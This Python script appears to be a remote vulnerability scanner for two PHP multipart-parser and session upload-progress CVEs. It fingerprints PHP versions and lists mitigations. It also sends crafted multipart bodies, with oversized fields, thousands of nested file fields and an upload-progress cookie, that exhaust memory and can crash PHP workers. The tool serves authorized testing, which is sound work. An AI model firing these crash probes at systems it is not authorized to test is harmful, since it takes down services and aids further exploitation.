#!/usr/bin/env python3
"""
PHP2SHELL remote scanner — CVE-2026-109618 / CVE-2026-109619 (PHP 5.4.0 - 8.5.11)
=================================================================================
Checks whether a TARGET you own or are authorized to test is running a
vulnerable PHP build. Built from the 8.5.11 -> 8.5.12 diff and the published
research (PHP advisories, Wiz Research, Calif, HackTheBox War Room), with the
mechanics verified against locally built 8.5.11 (vulnerable) and 8.5.12 (fixed)
binaries:

  * The rfc1867 multipart parser runs before any userland PHP. An oversized
    TEXT field forces its body-buffer allocation past memory_limit ->
    "Allowed memory size of N bytes exhausted at .../main/rfc1867.c:NNN".
    (Lab: 8.5.11 rfc1867.c:632, 8.5.12 rfc1867.c:665 — same code path.)
  * NESTED EMPTY FILE FIELDS build several metadata trees per part: with
    max_file_uploads lifted, ~2500 parts (0.3 MB body) exhaust a 4M limit
    (~18x amplification) and the fatal lands in zend_hash.c — the HashTable
    count-then-key-alloc-fail corruption primitive behind the demonstrated
    RCE (CVE-2026-109618). PHP's default max_file_uploads=20 caps this —
    that default is itself one of the documented edge mitigations.
  * With a PHPSESSID cookie + a PHP_SESSION_UPLOAD_PROGRESS field, the
    session module publishes PS(id) into request memory during parsing. On
    the vulnerable build the follow-up request SEGFAULTS the worker
    (stale-state corruption, CVE-2026-109619 class) — verified 4/4 in the
    lab; the fixed build survives every follow-up.
  * With display_errors=1 the fatal text lands in the response body (it
    leaks memory_limit and the exact .c:NNN site). With display_errors=0
    both builds die with an HTTP 5xx and an empty body — the crash alone
    cannot tell them apart, so the version string decides.
  * An unexpectedly LARGE or malformed PHPSESSID Set-Cookie on a response
    is the published signature of the stale-PS(id) memory disclosure
    (heap contents URL-encoded into the cookie). Checked on every response.
  * File-part uploads otherwise stream to disk — only the nested-field
    amplification and oversized text field are triggers.

AUTHORIZATION: run this only against sites you own or have written
permission to test. Probes are visible in access logs.

Exit codes: 0 = NOT VULNERABLE / inconclusive, 2 = VULNERABLE,
            3 = LIKELY VULNERABLE, 1 = scanner error.

Stdlib only (Python 3.7+).
"""
import argparse
import json
import random
import re
import string
import sys
import time
import urllib.error
import urllib.request
import http.client
from urllib.parse import urlsplit

USER_AGENT = "php2shell-scanner/1.1 (authorized security research)"
TIMEOUT = 25
MAX_STEPS = 8
VERSION = "1.1"

BANNER = r"""
    ██████╗ ██╗  ██╗███████╗██╗  ██╗    ███████╗██╗  ██╗███████╗██╗     █████╗
   ██╔═══██╗██║  ██║██╔════╝╚██╗██╔╝    ██╔════╝██║  ██║██╔════╝██║    ██╔══██╗
   ██║   ██║███████║█████╗   ╚███╔╝     ███████╗███████║█████╗  ██║    ███████║
   ██║   ██║██╔══██║██╔══╝   ██╔██╗    ╚════██║██╔══██║██╔══╝  ██║    ██╔══██║
   ╚██████╔╝██║  ██║███████╗██╔╝ ██╗   ███████║██║  ██║███████╗███████╗██║  ██║
    ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝   ╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝╚═╝  ╚═╝
     CVE-2026-109618 · CVE-2026-109619 · PHP 5.4.0–8.5.11 · fixed 8.5.12/8.4.27/8.3.36/8.2.35
"""

OOM_RE = re.compile(
    r"Allowed memory size of (\d+) bytes exhausted at ([^\s()]+\.c):(\d+)")
VERSION_RE = re.compile(r"PHP/?\s*(\d+\.\d+(?:\.\d+)?)")

# Post-fix releases (fixed 2026-10-21). A version AT OR ABOVE the fixed
# patch for its branch is not affected by the upstream fix. NOTE: a banner
# version alone cannot prove a DISTRO build has (or lacks) a backport.
FIXED_MIN = {
    "8.5": (8, 5, 12),
    "8.4": (8, 4, 27),
    "8.3": (8, 3, 36),
    "8.2": (8, 2, 35),
    # 8.1 and older have no upstream security release; PHP published limited
    # source backports for 7.4/8.0/8.1. A banner reporting these is treated
    # as in-range (vulnerable) unless a distro backport is confirmed.
    "8.1": (8, 1, 0),
    "8.0": (8, 0, 0),
    "7.4": (7, 4, 0),
    "7.3": (7, 3, 0),
    "7.2": (7, 2, 0),
    "7.1": (7, 1, 0),
    "7.0": (7, 0, 0),
    "5.6": (5, 6, 0),
    "5.5": (5, 5, 0),
    "5.4": (5, 4, 0),
}

MITIGATIONS = """  MITIGATIONS (patching is the only complete fix — 8.5.12 / 8.4.27 / 8.3.36 / 8.2.35):
    * Update PHP, then restart / replace every PHP worker.
    * memory_limit=-1 administratively (php_admin_value) — removes the
      predictable memory-limit trigger (check no pool/dir/app restores it).
    * session.upload_progress.enabled=0 in php.ini / FPM / server config
      applied BEFORE request parsing — ini_set() and .user.ini are too late.
    * PHP 8.5: fatal_error_backtraces=0 administratively.
    * FPM: pm.max_requests=1 interrupts cross-request chains (perf cost).
    * Edge limits on decoded request size, multipart parts, nesting depth."""

# A normal PHPSESSID is sid_length chars (default 32, max 255) of
# [0-9a-z,-]. Anything well beyond that, or full of percent-encoding,
# is the published stale-PS(id) disclosure signature.
SID_MAX_NORMAL = 64


def parse_ver(v):
    parts = [int(x) for x in v.split(".")[:3]]
    while len(parts) < 3:
        parts.append(0)
    return tuple(parts)


def version_status(version):
    """'fixed', 'vulnerable', or 'unknown' for a dotted version string."""
    v = version.strip()
    m = re.search(r"(\d+\.\d+(?:\.\d+)?)", v)
    if not m:
        return "unknown"
    dotted = m.group(1)
    major_minor = ".".join(dotted.split(".")[:2])
    if major_minor not in FIXED_MIN:
        return "unknown"
    if parse_ver(dotted) >= FIXED_MIN[major_minor]:
        return "fixed"
    return "vulnerable"


def boundary():
    return "----PHP2SHELL-" + "".join(
        random.choice(string.ascii_letters + string.digits) for _ in range(16))


def build_multipart(bound, field_name, value):
    return (
        ("--%s\r\n" % bound).encode() +
        ('Content-Disposition: form-data; name="%s"\r\n' % field_name).encode() +
        b"Content-Type: text/plain\r\n\r\n" +
        value +
        b"\r\n" +
        ("--%s--\r\n" % bound).encode()
    )


def build_progress_probe(bound):
    """Small multipart WITH the upload-progress field: the follow-up must
    reach the session upload-progress path before normal Session init
    resets PS(id) — that is where the stale pointer is dereferenced
    (verified: without this field the follow-up survives; with it, the
    vulnerable worker dies 4/4)."""
    return (
        (b"--%s\r\n" % bound.encode()) +
        b'Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\n' +
        b"php2shell\r\n" +
        ("--%s\r\n" % bound).encode() +
        b'Content-Disposition: form-data; name="x"\r\n\r\n' +
        b"1\r\n" +
        ("--%s--\r\n" % bound).encode()
    )


def build_hash_probe(bound, parts):
    """Nested empty FILE fields -> several metadata trees per part
    (HashTable amplification). A PHP_SESSION_UPLOAD_PROGRESS field comes
    FIRST so the session module's early path engages; sent with a
    PHPSESSID cookie by the caller.  ~120 bytes per part."""
    out = [(b"--%s\r\n" % bound.encode())]
    out.append(b'Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\n')
    out.append(b"php2shell\r\n")
    for i in range(parts):
        out.append(("--%s\r\n" % bound).encode())
        out.append(('Content-Disposition: form-data; name="f[%d][a][b]"; filename="e"\r\n' % i).encode())
        out.append(b"Content-Type: application/octet-stream\r\n\r\n\r\n")
    out.append(("--%s--\r\n" % bound).encode())
    return b"".join(out)


def http_request(url, method, headers, body=None, timeout=TIMEOUT):
    """Returns (status, body_bytes, wall_seconds, err). Never raises."""
    req = urllib.request.Request(url, data=body, method=method)
    for k, v in headers.items():
        req.add_header(k, v)
    t0 = time.monotonic()
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            data = r.read()
            return r.status, data, time.monotonic() - t0, None
    except urllib.error.HTTPError as e:
        try:
            data = e.read()
        except Exception:
            data = b""
        return e.code, data, time.monotonic() - t0, None
    except Exception as e:
        return None, b"", time.monotonic() - t0, repr(e)


def http_request_full(url, method, headers, body=None, timeout=TIMEOUT):
    """Returns (status, set_cookie, body_bytes, err). Never raises.
    Uses http.client so Set-Cookie is visible (urllib drops duplicates)."""
    u = urlsplit(url)
    host, port = u.hostname, u.port or (443 if u.scheme == "https" else 80)
    t0 = time.monotonic()
    try:
        if u.scheme == "https":
            c = http.client.HTTPSConnection(host, port, timeout=timeout)
        else:
            c = http.client.HTTPConnection(host, port, timeout=timeout)
        c.request(method, u.path or "/", body=body, headers=headers)
        r = c.getresponse()
        data = r.read()
        sc = r.getheader("Set-Cookie")
        c.close()
        return r.status, sc, data, time.monotonic() - t0, None
    except Exception as e:
        return None, None, b"", time.monotonic() - t0, repr(e)


def sid_anomaly(set_cookie):
    """Returns (sid_value, anomaly_bool, reason) from a Set-Cookie header."""
    if not set_cookie or "PHPSESSID" not in set_cookie:
        return None, False, None
    m = re.search(r"PHPSESSID=([^;\s]+)", set_cookie)
    if not m:
        return None, False, None
    val = m.group(1)
    if len(val) > SID_MAX_NORMAL:
        return val, True, "PHPSESSID length %d >> normal %d (sid_length default 32)" % (
            len(val), SID_MAX_NORMAL)
    bad = re.sub(r"[0-9a-z,\-]", "", val, flags=re.I)
    if bad:
        return val, True, "PHPSESSID contains non-session characters %r" % bad[:40]
    return val, False, None


class Scanner:
    def __init__(self, url, max_field, hash_parts):
        self.url = url
        self.max_field = max_field
        self.hash_parts = hash_parts
        self.findings = []

    def log(self, msg):
        print("  %s" % msg, flush=True)

    def record(self, what, **kw):
        self.findings.append(dict(what=what, **kw))
        self.log("%s" % json.dumps(kw)[:170])

    # -- step 1: fingerprint ------------------------------------------------
    def fingerprint(self):
        self.log("[1] fingerprinting %s" % self.url)
        req = urllib.request.Request(self.url, method="GET",
                                     headers={"User-Agent": USER_AGENT})
        t0 = time.monotonic()
        try:
            with urllib.request.urlopen(req, timeout=TIMEOUT) as r:
                status = r.status
                headers_blob = str(r.headers)
                body = r.read()
        except urllib.error.HTTPError as e:
            status = e.code
            headers_blob = str(e.headers)
            try:
                body = e.read()
            except Exception:
                body = b""
        except Exception as e:
            self.record("unreachable", error=repr(e))
            raise SystemExit(1)
        dt = time.monotonic() - t0
        blob = (headers_blob + "\n" + body[:65536].decode("utf-8", "replace"))
        versions = sorted(set(m.group(1) for m in VERSION_RE.finditer(blob)))
        xpb = None
        m = re.search(r"X-Powered-By:\s*(PHP/\S+)", blob, re.I)
        if m:
            xpb = m.group(1)
        srv = re.search(r"Server:\s*([^\r\n]+)", blob, re.I)
        self.record("fingerprint", status=status, php_versions=versions,
                    x_powered_by=xpb, server=srv.group(1) if srv else None,
                    get_seconds=round(dt, 3))
        verdicts = [version_status(v) for v in versions]
        best = "unknown"
        if any(v == "vulnerable" for v in verdicts):
            best = "vulnerable"
        elif any(v == "fixed" for v in verdicts):
            best = "fixed"
        return versions, best, dt

    def post_headers(self, bound, body, with_cookie=False):
        h = {"User-Agent": USER_AGENT,
             "Content-Type": "multipart/form-data; boundary=" + bound}
        if with_cookie:
            h["Cookie"] = "PHPSESSID=" + "a" * 32
        return h

    # -- step 3: HashTable amplification + stale-state probe ----------------
    def hash_probe(self, bound):
        """Nested empty file fields + upload-progress + PHPSESSID cookie.
        Cheap (~0.3 MB at 2500 parts) and reaches the strongest signals:
        the zend_hash.c corruption-primitive OOM, and (on vulnerable
        builds) a follow-up request that kills the worker."""
        self.log("[2] HashTable amplification probe: %d nested empty file "
                 "fields + upload-progress + PHPSESSID cookie (~%.2f MB)"
                 % (self.hash_parts,
                    self.hash_parts * 0.00012))
        body = build_hash_probe(bound, self.hash_parts)
        hdrs = self.post_headers(bound, body, with_cookie=True)
        status, sc, resp, dt, err = http_request_full(
            self.url, "POST", hdrs, body)
        text = resp.decode("utf-8", "replace")
        out = {"what_probe": "hash_amplification",
               "parts": self.hash_parts, "body_bytes": len(body),
               "status": status, "seconds": round(dt, 3), "error": err}
        sid, anom, reason = sid_anomaly(sc)
        if sid is not None:
            out["phpsessid_len"] = len(sid)
        m = OOM_RE.search(text)
        if m:
            out.update(oom=True, memory_limit_bytes=int(m.group(1)),
                       oom_site="%s:%s" % (m.group(2).split("/")[-1], m.group(3)),
                       fatal_excerpt=re.sub(r"\s+", " ", text)[:300])
        elif status is None or (isinstance(status, int) and status >= 500
                                and not text.strip()):
            out.update(crash_signal=True,
                       note="worker died on the amplification probe itself")
        self.record("hash_probe", **out)

        if not (m or out.get("crash_signal")):
            self.log("  no OOM — default max_file_uploads=20 (or an edge "
                     "limit) caps the amplification path, or memory_limit "
                     "is above the probe")
            return out

        # Follow-up small request WITH the upload-progress field: on a
        # vulnerable build the stale state (PS(id) / HashTable) kills the
        # worker here. On a fixed build it must answer normally.
        self.log("  follow-up upload-progress request (stale-state check) ...")
        small = build_progress_probe(bound)
        hdrs = self.post_headers(bound, small, with_cookie=True)
        s2, sc2, r2, dt2, err2 = http_request_full(self.url, "POST", hdrs, small)
        sid2, anom2, reason2 = sid_anomaly(sc2)
        follow = {"status": s2, "seconds": round(dt2, 3), "error": err2,
                  "phpsessid_len": len(sid2) if sid2 else None}
        if anom2:
            follow["phpsessid_anomaly"] = reason2
            self.log("  >>> ANOMALOUS PHPSESSID — %s" % reason2)
        if s2 is None:
            # Only counts as stale-state corruption when the probe itself
            # got a response (worker was alive after the OOM). If the probe
            # connection already died (status None), the follow-up death is
            # ambiguous (worker may have died on the probe).
            if isinstance(status, int):
                follow["worker_died"] = True
                follow["note"] = ("follow-up request killed the worker after "
                                  "the HashTable OOM — cross-request "
                                  "stale-state corruption (CVE-2026-109619 "
                                  "class). Verified deterministic on 8.5.11 "
                                  "in the lab; the fixed 8.5.12 survives.")
                self.log("  >>> WORKER DIED on follow-up — stale-state corruption")
            else:
                follow["note"] = ("follow-up died, but the probe connection "
                                  "also died — ambiguous (worker may have "
                                  "died on the probe itself)")
        self.record("hash_follow_up", **follow)
        out["follow_up"] = follow
        out["worker_died_after"] = bool(follow.get("worker_died"))
        out["phpsessid_anomaly"] = bool(anom2)
        return out

    # -- step 4: text-field OOM sweep ---------------------------------------
    def oom_sweep(self, bound):
        self.log("[3] probing rfc1867 OOM (text field sweep, cap %d MB)"
                 % (self.max_field // 1048576))
        size = 16 * 1048576   # OOMs a 4M-limit lab build at ~16MB field
        last = None
        step = 0
        while size <= self.max_field and step < MAX_STEPS:
            if step == 0:
                bstatus, bresp, bdt, berr = self.baseline_post(bound, 256)
                if bstatus is None:
                    self.record("post_refused", error=berr)
                    return None
                self.record("baseline_small_post", status=bstatus,
                            seconds=round(bdt, 3),
                            body_prefix=bresp[:200].decode("utf-8", "replace"))
            self.log("  POST text field %d MB ..." % (size // 1048576))
            body = build_multipart(bound, "f", b"B" * size)
            hdrs = self.post_headers(bound, body, with_cookie=True)
            status, sc, resp, dt, err = http_request_full(
                self.url, "POST", hdrs, body)
            text = resp.decode("utf-8", "replace")
            last = {"step": step + 1, "field_mb": size // 1048576,
                    "status": status, "seconds": round(dt, 3), "error": err}
            m = OOM_RE.search(text)
            if m:
                last.update(oom=True, memory_limit_bytes=int(m.group(1)),
                            oom_site="%s:%s" % (m.group(2).split("/")[-1],
                                                m.group(3)),
                            fatal_excerpt=re.sub(r"\s+", " ", text)[:300])
                self.record("oom_fatal_observed", **last)
                return last
            if status is None or (isinstance(status, int) and status >= 500
                                  and not text.strip()):
                last.update(crash_signal=True,
                            note="worker died on oversized POST while a "
                                 "small POST was fine (display_errors=0 "
                                 "hides the fatal text)")
                self.record("oom_crash_signal", **last)
                return last
            step += 1
            size = size * 2
        self.record("no_oom_observed", last_post=last,
                    note="server memory_limit above the probe cap, "
                         "post_max_size capped the body, memory_limit=-1 "
                         "mitigation in force, or OOM was hidden")
        return None

    def baseline_post(self, bound, size):
        body = build_multipart(bound, "f", b"A" * size)
        hdrs = self.post_headers(bound, body)
        status, resp, dt, err = http_request(self.url, "POST", hdrs, body)
        return status, resp, dt, err


def main():
    ap = argparse.ArgumentParser(
        prog="php2shell",
        description="PHP2SHELL (CVE-2026-109618/109619) scanner. "
                    "AUTHORIZED TARGETS ONLY.")
    ap.add_argument("target", help="http(s)://host:port/path you are "
                                   "authorized to test")
    ap.add_argument("--max-field-mb", type=int, default=256,
                    help="max oversized text field in MB (default 256)")
    ap.add_argument("--hash-parts", type=int, default=2500,
                    help="nested file fields in the HashTable probe "
                         "(default 2500, ~0.3 MB)")
    ap.add_argument("--yes-i-own-or-authorized", action="store_true",
                    help="confirm authorization to probe this host")
    ap.add_argument("--json", action="store_true",
                    help="also print a JSON findings block")
    args = ap.parse_args()

    print(BANNER)
    print("  scanner v%s · stdlib only · authorized targets only\n" % VERSION)

    if not args.yes_i_own_or_authorized:
        print("Refusing: this probe sends crafted multipart POSTs to a remote host.")
        print("Pass --yes-i-own-or-authorized only if you own the target or")
        print("have written permission to test it.")
        sys.exit(1)

    if not re.match(r"^https?://", args.target):
        print("Target must be an http(s):// URL, got: %s" % args.target)
        sys.exit(1)

    print("=" * 72)
    print("Target: %s" % args.target)
    print("=" * 72)

    sc = Scanner(args.target, args.max_field_mb * 1048576, args.hash_parts)
    bound = boundary()

    versions, ver_status, get_dt = sc.fingerprint()

    hash_res = sc.hash_probe(bound)
    hash_oom = bool(hash_res.get("oom"))
    hash_site = hash_res.get("oom_site", "")
    hash_is_zend = "zend_hash" in hash_site
    died_after = bool(hash_res.get("worker_died_after"))
    sid_anom = bool(hash_res.get("phpsessid_anomaly"))
    hash_crash = bool(hash_res.get("crash_signal"))

    oom = None
    if not (hash_oom or hash_crash):
        # Only escalate to the heavy text-field sweep if the cheap probe
        # gave nothing.
        oom = sc.oom_sweep(bound)
    else:
        sc.log("[3] text-field sweep skipped (HashTable probe already "
               "produced a signal)")

    crash = bool(oom and oom.get("crash_signal"))
    oom_rf = bool(oom and oom.get("oom") and "rfc1867" in oom.get("oom_site", ""))
    if oom_rf or crash:
        # one stale-state round already done inside hash_probe when it ran;
        # if only the sweep ran, do the classic round here
        small = build_multipart(bound, "x", b"1")
        hdrs = sc.post_headers(bound, small)
        s1, sc1, r1, _, _ = http_request_full(sc.url, "POST", hdrs, small)
        s2, sc2, r2, _, _ = http_request_full(sc.url, "POST", hdrs, small)
        sc.record("stale_state_probe",
                  first=(s1, r1[:120].decode("utf-8", "replace")),
                  second=(s2, r2[:120].decode("utf-8", "replace")),
                  identical_responses=(r1 == r2),
                  note="divergence after OOM = 109619 stale-state signal")
    else:
        sc.log("[4] stale-state check skipped (no OOM observed)")

    # ---- verdict -----------------------------------------------------------
    print("\n" + "=" * 72)
    print("VERDICT")
    print("=" * 72)
    oom_site = (oom or {}).get("oom_site", "") or hash_site
    leak = "Allowed memory size" in json.dumps(sc.findings)

    if died_after:
        verdict = "VULNERABLE — cross-request stale-state corruption observed"
        code = 2
        detail = ("After the HashTable OOM (%s), the follow-up request "
                  "killed the worker. That is the CVE-2026-109619 "
                  "stale-state class reproduced live: request-owned state "
                  "survives the fatal and corrupts the next request. "
                  "Deterministic on vulnerable builds in the lab (4/4); "
                  "the fixed 8.5.12 survives every follow-up." % hash_site)
    elif sid_anom:
        verdict = "VULNERABLE — memory disclosure signature observed"
        code = 2
        detail = ("A response carried an anomalously large or malformed "
                  "PHPSESSID Set-Cookie — the published stale-PS(id) "
                  "disclosure signature (heap contents URL-encoded into "
                  "the cookie). Process memory is leaking over the wire.")
    elif (hash_is_zend or oom_rf) and ver_status in ("vulnerable", "unknown"):
        verdict = "VULNERABLE"
        code = 2
        which = ("the HashTable corruption primitive (%s), the demonstrated "
                 "RCE path" % hash_site) if hash_is_zend else \
                ("the rfc1867 pre-request parser OOM path (%s)" % oom_site)
        detail = ("OOM fatal fired inside %s; reported PHP %s (%s). "
                  "CVE-2026-109618 on a pre-fix build." %
                  (which, versions or "unidentified", ver_status))
    elif hash_crash and ver_status in ("vulnerable", "unknown"):
        verdict = "LIKELY VULNERABLE (worker crashed on amplification probe)"
        code = 3
        detail = ("The nested-file-field probe killed the worker while a "
                  "small POST was fine, and PHP reports %s (%s)." %
                  (versions or "unidentified", ver_status))
    elif crash and ver_status in ("vulnerable", "unknown"):
        verdict = ("LIKELY VULNERABLE (worker crashed on oversized POST; "
                   "pre-fix build reported)")
        code = 3
        detail = ("An oversized text field crashed the worker while small "
                  "POSTs succeeded, and PHP reports %s (%s) — a pre-fix "
                  "build. On pre-fix 8.5.11 an rfc1867 OOM is fatal and not "
                  "recovered, which is exactly this crash." %
                  (versions or "unidentified", ver_status))
    elif crash or hash_crash:
        verdict = ("INCONCLUSIVE (worker crashed on a probe; version not in "
                   "affected range or unidentifiable)")
        code = 0
        detail = ("A worker crash was observed (HTTP %s), but the reported "
                  "version %s (%s) is a fixed build or unidentifiable. A "
                  "fixed build defers the OOM — so either the version is "
                  "misreported (distro backport status unknown), the crash "
                  "is unrelated (proxy 502, a different limit), or another "
                  "memory-safety variant is in play. Investigate before "
                  "ruling safe." %
                  ((oom or hash_res).get("status"), versions or "unidentified",
                   ver_status))
    elif (hash_is_zend or oom_rf):
        verdict = "NOT VULNERABLE (fixed build reported; OOM deferred, not fatal)"
        code = 0
        detail = ("The parser OOMed at %s but PHP reports %s (%s), in the "
                  "fixed set. On a fixed build the OOM is deferred and "
                  "recovered — no RCE. CAVEAT: a banner version cannot "
                  "prove a distro build carries (or lacks) a backport; "
                  "verify the actual package." %
                  (oom_site, versions or "unidentified", ver_status))
    elif leak and not (hash_is_zend or oom_rf):
        verdict = "PARTIAL (OOM in userland only — not the CVE parser path)"
        code = 0
        detail = ("A memory-exhaustion fatal was seen, but outside the "
                  "parser. Re-run with a larger --max-field-mb if "
                  "memory_limit is high.")
    elif ver_status == "vulnerable":
        verdict = ("LIKELY VULNERABLE (version in affected range; OOM not "
                   "observed at probe caps)")
        code = 3
        detail = ("PHP %s reports a pre-fix build, but no OOM fired. Either "
                  "memory_limit is above the probes (raise --max-field-mb / "
                  "--hash-parts), post_max_size capped the body, or the "
                  "memory_limit=-1 mitigation is in force (which blocks the "
                  "109618 trigger but is NOT a fix). Treat as vulnerable "
                  "until proven otherwise." % (versions or ""))
    elif ver_status == "fixed":
        verdict = "NOT VULNERABLE (fixed build reported; no OOM observed)"
        code = 0
        detail = ("PHP reports %s, in the fixed set, and no OOM/crash was "
                  "observed. CAVEAT: confirm the package actually carries "
                  "the fix — banners cannot prove distro backports." %
                  (versions,))
    else:
        verdict = "INCONCLUSIVE"
        code = 0
        detail = ("No OOM, no crash, and the PHP version could not be "
                  "identified or is outside the known affected set. "
                  "Fingerprint the host another way.")

    print("  %s" % verdict)
    print("  " + detail)
    for src in (hash_res, oom or {}):
        lim = src.get("memory_limit_bytes")
        if lim:
            print("  observed memory_limit: %d bytes (%.1f MiB)" % (lim, lim / 1048576))
    if hash_site:
        print("  HashTable probe fatal site: %s" % hash_site)
    if oom and oom.get("field_mb"):
        print("  oversized POST: %d MB, HTTP %s, %.2fs" %
              (oom.get("field_mb", 0), oom.get("status"), oom.get("seconds", 0)))

    if code in (2, 3):
        print("\n" + MITIGATIONS)

    print("\n  Authorization reminder: probes are visible in access logs.")
    print("  Run only on targets you own or are authorized to test.")

    if args.json:
        print("\nJSON FINDINGS")
        print(json.dumps({"target": args.target, "scanner_version": VERSION,
                          "verdict": verdict,
                          "php_versions": versions,
                          "version_status": ver_status,
                          "findings": sc.findings}, indent=2))

    sys.exit(code)


if __name__ == "__main__":
    main()
